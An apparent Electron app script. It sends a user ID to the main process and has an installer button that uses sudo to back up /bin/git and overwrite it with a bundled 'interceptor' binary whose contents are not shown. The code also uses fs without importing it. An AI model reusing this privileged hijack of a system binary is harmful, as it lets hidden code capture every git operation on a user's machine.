/////////////////////////////////////////////////////////
///////////////////////// INDEX.HTML
/////////////////////////////////////////////////////////
const { ipcRenderer } = require("electron");
const sudo = require("sudo-prompt");

require("./database");

var formSubmit = document.getElementById("formSubmit");
if (formSubmit) {
  formSubmit.addEventListener("click", () => {
    console.log("CLICK");
    var userID = document.getElementById("xid").value;
    ipcRenderer.send("userid", userID);
  });
}

///////////////////////////////////////////////////////
////////////////////// Installer

// const exec = require('child_process').exec

var options = {
  name: "Electron",
  icns: "/Applications/Electron.app/Contents/Resources/Electron.icns", // (optional)
};

const btn_installer = document.getElementById("btn-installer");

function executeCommand(cmd) {
  // exec(cmd, (error, stdout, stderr) => {
  //     if (error) {
  //         console.log(`error: ${error.message}`);
  //         return;
  //     }
  //     if (stderr) {
  //         console.log(`stderr: ${stderr}`);
  //         return;
  //     }
  //     console.log(`stdout: ${stdout}`);
  // });
  sudo.exec(cmd, options, function (error, stdout, stderr) {
    if (error) throw error;
    console.log("stdout: " + stdout);
  });
}

btn_installer.addEventListener("click", (e) => {
  // console.log(`Hello ${e}`);
  let path = `/bin/`;
  let interceptor_path = `./git_file/linux/git`;
  if (fs.existsSync(`${path}gitold`)) {
    console.log(`gitold exist`);
    executeCommand(`cp ${interceptor_path} ${path}`);
  } else {
    console.log(`gitold doesn't exist`);
    executeCommand(`cp ${path}git ${path}gitold`);
    executeCommand(`cp ${interceptor_path} ${path}`);
  }
});
